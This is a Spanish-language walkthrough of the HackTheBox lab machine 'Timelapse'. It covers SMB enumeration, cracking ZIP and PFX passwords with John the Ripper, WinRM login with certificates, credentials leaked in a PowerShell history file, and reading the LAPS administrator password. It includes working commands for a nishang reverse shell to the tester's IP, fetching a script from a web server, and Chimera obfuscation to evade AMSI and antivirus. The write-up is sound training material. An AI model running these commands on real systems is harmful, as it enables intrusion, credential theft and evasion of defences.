---
layout      : post
title       : "HackTheBox - Timelapse"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452banner.png
category    : [ htb ]
tags        : [ LAPS, winrm-keys, bypass-AV, command-history ]
---
Máquina Windows nivel fácil. Backups con certificados **WinRM**, históricos de comandos algo agresivos, sacamos a **passear** a los antivirus e interactuamos con la contraseña del administrador mediante `LAPS`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452timelapseHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [ctrlzero](https://www.hackthebox.eu/profile/168546).

A Invokar a los Comandantes.

Tendremos una carpeta compartida por **SMB** la cual tiene dos objetos con ideas claras: `winrm_backup` y `LAPS`, para la primera fase jugaremos con crackeo de contraseñas para extraer llaves de autenticación **SSL** contra `WinRM`, esto nos servirá para obtener una terminal como el usuario `legacyy`.

**Legacyy** se ha dejado un historial de comandos algo llamativo, lo usaremos para ejecutar comandos como el usuario `svc_deploy` usando funciones de **PowerShell**. Pero tendremos que jugar con ofuscación de scripts para saltarnos un antivirus molestón, con esto obtendremos finalmente una terminal como el usuario **svc_deploy**.

Acá se retomará la otra idea inicial: `LAPS`, aprovecharemos que **svc_deploy** está en el grupo `LAPS Readers` para ver la contraseña temporal del usuario **administrador local**, esto en conjunto con funciones de **PowerShell**, bypass y demás cositas, nos permitirá generar una consola de comandos como el usuario `administrator`.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452statistics.png" style="width: 80%;"/>

Llevada a la realidad de a poco, aunque toca varios temas reales.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

It's time to show your love.

1. [Reconocimiento](#reconocimiento).
2. [Enumeración](#enumeracion).
  * [Extraemos subdominio mediante el servicio DNS](#enum-port-53).
  * [Encontramos carpeta compartida en SMB](#enum-port-smb).
3. [Explotación](#explotacion).
  * [Bruteforceamos contraseña de un archivo `.zip`](#john-bruteforce-zip).
4. [Movimiento lateral: legacyy -> svc_deploy](#lateral-ps-historial).
  * [Reverse Shell mediante Invoke-Command](#revsh-ps-invokecommand).
  * [Saltando antivirus, pa que dejen de molestar](#obfuscation-ps-script).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Lo primero que debemos hacer es conocer contra que nos enfrentamos y sobre todo con que cuenta, ya que ese será nuestro punto de entrada. Usaré la herramienta `nmap` para descubrir que puertos (servicios) está ejecutando la máquina:

```bash
❱ nmap -p- --open -v -Pn 10.10.11.152 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -Pn       | Evitamos que el escaneo realice `ping`, ya que sin él no nos deja escanear |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos varios puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 53     | **[DNS](https://www.cloudflare.com/es-es/learning/dns/what-is-dns/)**: Traductor entre nombres de dominio a direcciones IP.  |
| 88     | **[KERBEROS](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-rg-es-4/ch-kerberos.html#:~:text=Kerberos%20es%20un%20protocolo%20de,a%20trav%C3%A9s%20de%20la%20red.)**: Protocolo de autenticación para evitar uso de contraseñas en una red. |
| 135    | **[MSRPC](https://www.extrahop.com/resources/protocols/msrpc/)**: Permite la comunicación entre dispositivos desconocidos en una red. |
| 139,445 | **[SMB]()**: Protocolo para compartir recursos en una red. |
| 389,636,3268,3269 | **[LDAP](https://www.techtarget.com/searchmobilecomputing/definition/LDAP)**: Protocolo usado para localizar recursos en una red. |
| 5986   | **[WinRM/SSL](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)**: Implementación usada para ejecutar tareas administrativas. |
| 9389   | **[ADWS](https://docs.microsoft.com/en-us/services-hub/health/remediation-steps-ad/configure-the-active-directory-web-services-adws-to-start-automatically-on-all-servers)**: Interfaz para interactuar con un directorio activo. |
| xxxxx  | Otros puertos que no tienen relevancia o se relacionan a los ya listados. |

Ahora que tenemos los puertos podemos volver a apoyarnos de `nmap` para intentar ver las versiones de cada servicio (puertos) yyyy también podemos jugar con unos scripts que tiene **nmap** y ver si logran descubrir otras cositas.

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, para así evitar tener que escribirlos uno a uno**
 
```bash
❱ extractPorts initScan
[*] Extracting information...

    [*] IP Address: 10.10.11.152
    [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49694,57865

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49694,57865 -sC -sV -Pn 10.10.11.152 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y de todo lo obtenido podemos destacar:

| Puerto   | Servicio | Versión |
| :------- | :------- | :------ |
| 389,3268 | LDAP     | Nada relevante |

* Nos muestra un dominio: `Domain: timelapse.htb`

De resto volvemos a ver el dominio en el puerto `5986 (WinRM/SSL)`, pero no tenemos nada más :(

Pues empecemos a jugar y veamos por donde entrarle a esta máquina...

# Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos en orden de los puertos a ver que vamos viendo :P Así que démosle al `53`:

## Extraemos subdominio mediante el DNS [📌](#enum-port-53) {#enum-port-53}

> "El ***sistema de nombres de dominio (DNS)*** es el directorio telefónico de Internet. Las personas acceden a la información en línea a través de **nombres de dominio** como nytimes.com o espn.com. Los navegadores web interactúan mediante **direcciones de Protocolo de Internet (IP)**. El DNS **<u>traduce</u>** los **nombres de dominio** a **direcciones IP** para que los navegadores puedan cargar los recursos de Internet." ~ [cloudflare](https://www.cloudflare.com/es-es/learning/dns/what-is-dns/).

Para interactuar con el servicio **DNS** (puerto `53`) podemos emplear [dig](https://www.hostinger.com/tutorials/how-to-use-the-dig-command-in-linux/):

El uso básico para buscar TODO con respecto a la dirección IP y el nombre de dominio seria:

```bash
❱ dig @10.10.11.152 timelapse.htb ANY
...
;; ANSWER SECTION:
timelapse.htb.          600     IN      A       10.10.11.152
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.timelapse.htb. 159 900 600 86400 3600
...
```

Obtenemos `dc01.timelapse.htb`, pues guardémoslo por si algo... Con este puerto no encontramos nada más, seguimos.

## Vemos carpeta compartida en SMB (139, 445) [📌](#enum-port-smb) {#enum-port-smb}

> "**SMB (Server Message Block)** es un protocolo cliente/servidor que gobierna el acceso a archivos y directorios completos, así como a otros recursos de red como impresoras, enrutadores o interfaces abiertas a la red." ~ [ayudaleyprotecciondatos](https://ayudaleyprotecciondatos.es/2021/03/04/protocolo-smb/).

En pocas palabras permite la distribución de archivos mediante una red.

Existen varias herramientas para validar si existen archivos compartidos, como por ejemplo `smbmap` (por ahora no tenemos credenciales, así que probamos nulas y vacías):

```bash
❱ smbmap -H 10.10.11.152 -u 'null' -p 'null'
[+] Guest session       IP: 10.10.11.152:445    Name: unknown
[!] Error:  (<class 'impacket.smbconnection.SessionError'>, 'smbmap', 1337)
❱ smbmap -H 10.10.11.152 -d timelapse.htb -u 'null' -p 'null'
[+] Guest session       IP: 10.10.11.152:445    Name: unknown
[!] Error:  (<class 'impacket.smbconnection.SessionError'>, 'smbmap', 1337)
```

Pero nada favorable, usemos otra herramienta llamada `smbclient` (`--no-pass` le indica que no use/pida credenciales):

```bash
❱ smbclient -L //10.10.11.152 --no-pass

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 

SMB1 disabled -- no workgroup available
```

Opa, tenemos contenidoooooooo! Existen varias carpetas compartidas, (por la experiencia con otras máquinas) sabemos que la única extraña es `Shares` (las demás están por default con SMB), aprovechemos `smbclient` para intentar listar su contenido, en caso de que nos deje lo que hará es otorgarnos una "Shell" para recorrer la carpeta:

```bash
❱ smbclient //10.10.11.152/Shares --no-pass
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares.png" style="width: 100%;"/>

Tamos dentro, pos veamos qué hay, usando `dir` (como en **Windows**) listamos contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares_dir.png" style="width: 100%;"/>

Hay dos carpetas, el contenido de `Dev` es:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares_cdYdir_Dev.png" style="width: 100%;"/>

¿Un **backup** de `winrm`? Que que que, suena muuuuy llamativo, veamos rápido `Help Desk` y volvemos a acá:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares_cdYdir_HelpDesk.png" style="width: 100%;"/>

Uhhh, **Microsoft LAPS (Local Administrator Password Solution)**, esto es nuevo para mí, más emocionante.

# Explotación [#](#explotacion) {#explotacion}

Juguemos inicialmente con el objeto `winrm_backup.zip`, si no extraemos nada útil, pues volvemos a **LAPS**. Para descargarlo mediante `smbclient` usamos el comando `get <file>`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_smbclient_Shares_get_Dev_ZIPfile.png" style="width: 100%;"/>

Y validando que tipo de archivo es (nunca se sabe):

```bash
❱ file winrm_backup.zip 
winrm_backup.zip: Zip archive data, at least v2.0 to extract
```

Perfecto, pues ya lo tenemos, para ver su contenido se puede usar `7z` y el argumento `l` (list):

```bash
❱ 7z l winrm_backup.zip 
...
2021-10-25 09:21:20 .....         2555         2405  legacyy_dev_auth.pfx
...
```

Contiene un objeto `.pfx`:

> Según [IBM](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file), el archivo `.pfx` conteiene un certificado **SSL** (tambien llamado **llave publica**) y una **llave privada**.

Pues extraigámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_unzip_ZIPfile_PW.png" style="width: 100%;"/>

## Bruteforceamos contraseña de un ZIP [📌](#john-bruteforce-zip) {#john-bruteforce-zip}

F, el `.zip` tiene una contraseña :( Peeeeero eso puede dejar de ser un problema en este momento :P Existe una herramienta que extrae en formato `hash` la contraseña del **ZIP** para posteriormente nosotros con `JohnTheRipper` intentar crackear el **hash** para ver la contraseña en texto plano :O 

La herramienta se llama `zip2john` (que también existe una llamada `fcrackzip` para descubrir la contraseña del **ZIP**, pero juguemos esta vez con **John**), en caso de no existir en nuestro sistema solo hay que instalar `JohnTheRipper` y con el vendrían muchos más objetos:

* [Romper contraseña de un archivo ZIP](https://www.reydes.com/d/?q=Romper_la_Contrasena_de_un_Archivo_ZIP_utilizando_John_The_Ripper).

Ejecutamos `zip2john` pasándole el archivo:

```bash
❱ zip2john winrm_backup.zip
```

Nos genera un **hash** gigante, guardémoslo en un archivo:

```bash
❱ zip2john winrm_backup.zip > winrm_backup.hash
```

Ya con el archivo lo siguiente es hacer lo que ya dijimos, usar [john](https://www.openwall.com/john/) para romper ese hash (si es que la contraseña está en el wordlist que le pasemos, ya que lo que hace es ir probando cada palabra contra el hash y si alguna hace *match* significa que es la contraseña) y por consiguiente obtener la password en texto plano:

```bash
❱ john -w:/usr/share/wordlists/rockyou.txt winrm_backup.hash 
```

* `-w`: Tiene el wordlist (lista de posibles contraseñas).

Obtenemos:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
...
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
...
Session completed
```

EEEEEJEEEEEPAAA! Nos devuelve una cadena de texto que ha hecho **match**: `supremelegacy`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_unzip_ZIPfile_correctPW.png" style="width: 100%;"/>

Liiistos, nos extrajo el archivo `.pfx`:

```bash
❱ file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
```

Del nombre podemos pensar varias cosas:

* `legacyy` o `legacyy_dev` puede ser un usuario del sistema.

  <span style="color: red;">(</span>Podríamos hacer reutilización de credenciales a ver si no solo son válidas para `openssl` si no por ejemplo para `crackmapexec` (SMB y WinRM) y `kerbrute` (Kerberos).

  ```bash
  #              smb o winrm
  ❱ crackmapexec smb 10.10.11.152 -u 'legacyy' -p 'thuglegacy'
  SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
  SMB         10.10.11.152    445    DC01             [-] timelapse.htb\legacyy:thuglegacy STATUS_LOGON_FAILURE
  ```

  Nada (quizás por lo que la autenticación juega con llaves para que sea válida), pero con `kerbrute` (contra el servicio [Kerberos](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-rg-es-4/ch-kerberos.html)) (agregando el dominio en el /etc/hosts):

  ```bash
  ❱ kerbrute -domain timelapse.htb -user legacyy
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

  [*] Valid user => legacyy
  [*] No passwords were discovered :'(
  ```

  Sabemos que el usuario `legacyy` existe en el directorio activo.

  <span style="color: red;">)</span>

* `dev` puede ser el entorno al que nos conectaremos, quizás debamos pivotear del **dev** al **prod**, ni idea.
* `auth` nos indica autenticación, quizás debamos usar las llaves que hay dentro del objeto `.pfx` para entablar una conexión mediante el servicio `WinRM` con algún usuario...

Pues extraigamos ahora tanto el certificado como la llave privada (: En Internet encontramos:

* [Extracting Certificate and Private Key Files from a `.pfx` File](https://wiki.cac.washington.edu/display/infra/Extracting+Certificate+and+Private+Key+Files+from+a+.pfx+File).

Para ello debemos hacer uso de [openssl](https://es.wikipedia.org/wiki/OpenSSL) (que es un conjunto de herramientas relacionadas con criptografía):

🔒 Extraemos llave privada:

```bash
❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
```

Pero en su ejecución:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_openssl_extractSSLyKEY_key_PW.png" style="width: 100%;"/>

Nos pide una contraseña, y probando la que ya obtuvimos no sirve :'( Peeeero, siempre hay un peeeeero!

## Bruteforceamos contraseña de un PFX [📌](#john-bruteforce-pfx) {#john-bruteforce-pfx}

Existe una herramienta también de `john` (es un master este loco) que hace lo mismo de antes: generar un hash con la contraseña y ya recae en nosotros jugar para ver si logramos crackearlo.

En este caso mi sistema no lo tiene instalado, pero en una búsqueda rápida en la web lo encontramos:

* [https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py)

Lo descargamos y simplemente ejecutamos:

```bash
❱ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/pfx2john.py
❱ python3 pfx2john.py legacyy_dev_auth.pfx
```

Nos genera de nuevo un output gigante, lo guardamos en un archivo yyyy jugamos:

```bash
❱ john -w:/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])
...
thuglegacy       (legacyy_dev_auth.pfx)
...
Session completed
```

PEEEEERFECTO! Tenemos la contraseña en texto plano :P Pos volvamos a probar a extraer la llave y el certificado.

* [Extracting Certificate and Private Key Files from a `.pfx` File](https://wiki.cac.washington.edu/display/infra/Extracting+Certificate+and+Private+Key+Files+from+a+.pfx+File).

🔒 Extraemos llave privada:

```bash
❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes
```

Colocamos la contraseña y obtenemos la llave privada :D

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_openssl_extractSSLyKEY_key_PW_DONE.png" style="width: 80%;"/>

🔑 Ahora extraemos certificado SSL (llave pública):

```bash
❱ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_openssl_extractSSLyKEY_ssl_PW_DONE.png" style="width: 80%;"/>

Listos, ya tenemos las llaves (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452google_gif_danceRGB.gif" style="width: 50%;"/>

Recordemos de nuevo el origen de estos objetos: `winrm_backup.zip`, es un backup relacionado con el servicio `WinRM`:

> `WinRM (Windows Remote Management)` "fue diseñado para proveer interoperabilidad y consistencia para redes empresariales que tienen una variedad de sistema operativos y así, poder localizar e intercambiar información de administración." ~ [geeks](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/).

Por lo que si permite realizar tareas administrativas, quizás exista alguna tarea donde usemos las llaves para iniciar sesión, pues a buscar...

> En Internet filtramos algo como esto: `winrm authentication shell linux` (en caso de que no conozcas la siguietne herramienta, ese seria un ejemplo de busqueda)

Encontramos este repo con una herramienta bien linda:

* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

> "The ultimate WinRM shell for hacking/pentesting"

El uso de `evil-winrm` nos permite entre muchas cosas entablar una **PowerShell** teniendo credenciales válidas en el sistema. Después de instalarlo, si nos fijamos en como usarlo tenemos tres parámetros interesantes:

> Por lo general `WinRM` corre en el puerto **5985**, pero cuando tiene implementado el `SSL` se ejecuta sobre el puerto **5986** (el que esta corriendo actuamente la máquina).

```bash
❱ evil-winrm -h
...
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
...
```

Podemos jugar con las llaves (SSL) para intentar entablarnos una **PowerShell**, veamos:

```bash
❱ evil-winrm -i 10.10.11.152 -u 'legacyy' -p 'thuglegacy' -S -c cert.pem -k privkey.pem
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_evilwinrm_legacyyPS.png" style="width: 100%;"/>

¡OBTENEMOS LA TERMINAL! (: Sigamos a ver que...

# Historias: legacyy -> svc_deploy [#](#lateral-ps-historial) {#lateral-ps-historial}

> Si recordamos en la carpeta compartida teniamos dos temas, `winrm_backup` y `LAPS`, ya exploramos uno, nos queda el otro ahí flotando, solo que investigando y probando cositas no logramos nada interesante ya que nuestro usuario esta chikito para poder interactuar los los **LAPS**.

Apoyados en [esta guía](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) para escalar privilegios en **Windows**, llegamos a una parte donde busca histórico de comandos, al probar nosotros obtenemos:

* [PowerShell History](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powershell-history).

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
whoami
exit
```

Opaaa, tenemos una contraseña que está asignada al usuario `svc_deploy`, lo que hizo básicamente es listar los puertos activos (supongo que para ver si el `5986` (winrm) lo estaba), generó una sesión para conectarse a ese puerto y ejecutar el comando `whoami` (como `svc_deploy`).

El correcto formato en una de las líneas para evitar frustraciones y enredos seria:

```powershell
...
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
...
```

Finalmente, muestra una lista de usuarios y sus propiedades, pero nada relevante...

Pues juguemos con ese histórico y ejecutemos también comandos como el usuario `svc_deploy` (si es que son válidas):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_evilwinrm_legacyyPS_HistoryFoundExecuted_whoami_svcDeploy.png" style="width: 100%;"/>

Efectivamente, tamos ejecutando comandos como el usuario `svc_deploy`, intentemos levantar una reverse shell.

## Reverse Shell mediante Invoke-Command [📌](#revsh-ps-invokecommand) {#revsh-ps-invokecommand}

Jugaremos con una, de tantas herramientas que nos permiten generar una reverse **PowerShell**, esta es de la suite de [nishang](https://github.com/samratashok/nishang) (colección de scripts juguetones para pentesting en PowerShell), se llama:

* [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Lo descargamos y en su contenido lo único que debemos hacer es copiar una línea **comentada** al final del archivo (y quitarle el comentario :P), esto para que cuando el archivo sea ejecutado lea esa línea y la ejecute. 

Esa línea lo que hace es enviar una **PowerShell** a un puerto que tendremos en escuchas sobre nuestra dirección IP, veamos la línea que moveremos:

```powershell
...
19 PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444·
<# 19 es el número de la linea #>
...
```

Entonces, tomamos esa línea completa, la movemos al finaaaaaaal del archivo, le quitamos `PS >`, asignamos los valores correctos tanto a la IP como al puerto y quedaría así:

```powershell
...
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.86 -Port 4433
```

Ahora levantemos el puerto `4433`:

```bash
❱ rlwrap nc -lvp 4433
```

> `rlwrap` nos permite movernos entre comandos y tener historico de ellos, lo que si permite es perder la terminal, así que ojito con el `CTRL+C`.

Ya con el puerto arriba, lo único que falta es subir el archivo `Invoke-PowerShellTcp.ps1` y ejecutarlo, solo que antes de eso, validemos en que parte del sistema lo subiremos:

```powershell
*Evil-WinRM* PS C:\> invoke-c... -scriptblock { ls -force }
...
    Directory: C:\Users\svc_deploy\Documents
...
```

Pues esa ruta está bien, procedamos a subirlo a la máquina ([maneras de subir un archivo de Linux a Windows](https://lanzt.gitbook.io/cheatsheet-pentest/#linux-to-windows)):

```powershell
*Evil-WinRM* PS C:\> invoke-c... -scriptblock { IWR -uri http://10.10.14.86:8000/Invoke-PowerShellTcp.ps1 -OutFile c:\Users\svc_deploy\Documents\Invoke-PowerShellTcp.ps1 }
```

Esperamos un poco, obtenemos la petición en nuestro servidor web yyy en el sistema debería estar el objeto:

```powershell
*Evil-WinRM* PS C:\> invoke-c... -scriptblock { ls -force }
...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
...
-a----      25/25/2022   25:25 AM           4403 Invoke-PowerShellTcp.ps1
...
```

Y listos, lo ejecutamos:

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock { .\Invoke-PowerShellTcp.ps1 }
...
This script contains malicious content and has been blocked by your antivirus software.
...
```

Ahss, sale un error que indica que el **antivirus** lo bloquea :o

## Saltando antivirus, que no molesten! [📌](#obfuscation-ps-script) {#obfuscation-ps-script}

PEEEEEEEERO! Buscando en internet encontramos este repo interesante que nos podría ayudar:

> "<u>Chimera</u> is a **PowerShell** obfuscation script **designed to bypass AMSI** and **commercial antivirus solutions**." ~ [Chimera](https://github.com/tokyoneon/Chimera).

Un ofuscador de scripts creados en **PowerShell**, esto sirve básicamente para saltar posibles "reglas" implementadas por antivirus o firewalls en un sistema, por ejemplo un antivirus busca cadenas de texto que contengan `"payload"`, lo que hará la herramienta es intentar ocultar esa string así (no específicamente, pero para que se entienda):

```powershell
$p1 = "pa"
$p2 = "ylo"
$p3 = "ad"

$f1 = $p1$p2$p3
```

Obviamente, hace muchos más procesos, pues probemos a ofuscar el contenido de nuestro objeto a ver si ese logra bypassear el antivirus. Nos clonamos el repo y con ayuda de "la ayuda" de como usarlo:

* [https://github.com/tokyoneon/Chimera#usage](https://github.com/tokyoneon/Chimera#usage)

Generamos el nuevo archivo llamado `new_invoke_shell.ps1`:

```bash
❱ ./chimera/chimera.sh -f Invoke-PowerShellTcp.ps1 -l 3 -o new_invoke_shell.ps1 -v -t powershell,windows,copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,invoke-expression,out-string,write-error -j -g -k -r -p
```

> Ejecutando `./chimera.sh` puedes ver que hace cada parametro agregado :P

Y se vería algo así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_chimera_ofuscatedInvokePowerShellTcp.png" style="width: 100%;"/>

khe khe :P, pues si, eso es ofuscamiento (:

Subimos ese archivo al sistema yyy lo ejecutamos a ver si con él tenemos éxito:

```powershell
*Evil-WinRM* PS C:\> invoke-c... -scriptblock { ./new_invoke_shell.ps1.ps1 }
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452bash_svcDeploy_RevPS_DONE.png" style="width: 100%;"/>

EEEEEEPA, ahora si logramos la **PowerShell** y podemos ejecutar comandos cómodamente! A seguir jugando...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Volviendo a las andanzas, retomamos el temita de `LAPS`, ahora si toma sentido por una sencilla razón al enumerar un poquito la información del usuario `svc_deploy`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_svcDeploy_netUser_LAPSreadersGROUP.png" style="width: 100%;"/>

El usuario `svc_deploy` está en un grupo llamado `LAPS Readers`, jmmmmmm, pero para que esto también tome sentido necesitamos saber que es eso de **LAPS**:

> Según lo leido en este [post](https://itconnect.uw.edu/wares/msinf/ous/laps/), **Local Administrator Password Solution (LAPS)** es un producto de Microsoft usado para gestionar la **contraseña** del usuario administrador, la finalidad es mantener la password en constante actualización. Esta guardada en el [directorio activo](https://www.quest.com/mx-es/solutions/active-directory/what-is-active-directory.aspx) y protegida por [listas de acceso (ACL)](https://www.techtarget.com/searchnetworking/definition/access-control-list-ACL), por lo que ***<u>solo usuarios especificos</u>*** pueden leerla e incluso pedir que sea actualizada :o

* Más info: [Running LAPS in the race to security](https://blog.netwrix.com/2021/08/25/running-laps-in-the-race-to-security/).

Upa, pues atrapante, más que nada porque el usuario `svc_deploy` seria uno de esos con los permisos necesarios para leer la contraseña, así que a explorar...

Caemos acá:

* [Deploy **LAPS**, Check! You’re all set, right? Maybe](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785)...

En su contenido cita este [artículo de Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), les recomiendo leerlo para entender realmente qué hace y como funciona **LAPS** a profundidad :P 

También usa el comando `Get-ADComputer`:

```powershell
Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd
```

Y con sentido, al saber que la contraseña está guardada en el directorio activo:

> "Active Directory (AD) es una base de datos y un conjunto de servicios que conectan a los usuarios con los recursos de red que necesitan para realizar su trabajo." "La base de datos (o el directorio) contiene información crítica sobre su entorno, incluidos los usuarios y las computadoras que hay y quién puede hacer qué." ~ [quest](https://www.quest.com/mx-es/solutions/active-directory/what-is-active-directory.aspx).

Pues se emplean comandos que juegan con él.

* [`Get-ADComputer`: Buscar detalles del equipo en el **directorio activo**](https://informaticamadridmayor.es/tips/get-adcomputer-busque-los-detalles-del-equipo-en-active-directory-con-powershell/).

En este caso él lo usa para extraer entre las propiedades del **computador** una llamada `MS-Mcs-AdmPwd`, que sería la que guarda la contraseña del **administrador** local <u>en texto plano</u> según [netwrix](https://blog.netwrix.com/2021/08/25/running-laps-in-the-race-to-security/#Extending_your_Active_Directory_schema_to_accommodate_LAPS), pues veamos que nos devuelve el comando ejecutado y si realmente la propiedad nos muestra la password :o

```powershell
Ps >Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_svcDeploy_GetADComputer_leakPassword.png" style="width: 80%;"/>

Ojiiiito, que si afinamos la vista tenemos la propiedad `MS-Mcs-AdmPwd` con contenidoooowowowowoo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_svcDeploy_GetADComputer_MSMcsAdmPwd.png" style="width: 100%;"/>

Tenemos la contraseña del ***administrador*** local, pues probemos deeeee uuuuuna si es valida con el mismo metodo usado con `svc_deploy`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_svcDeploy_InvokeCommand_AS_administrator_whoami_DONE.png" style="width: 100%;"/>

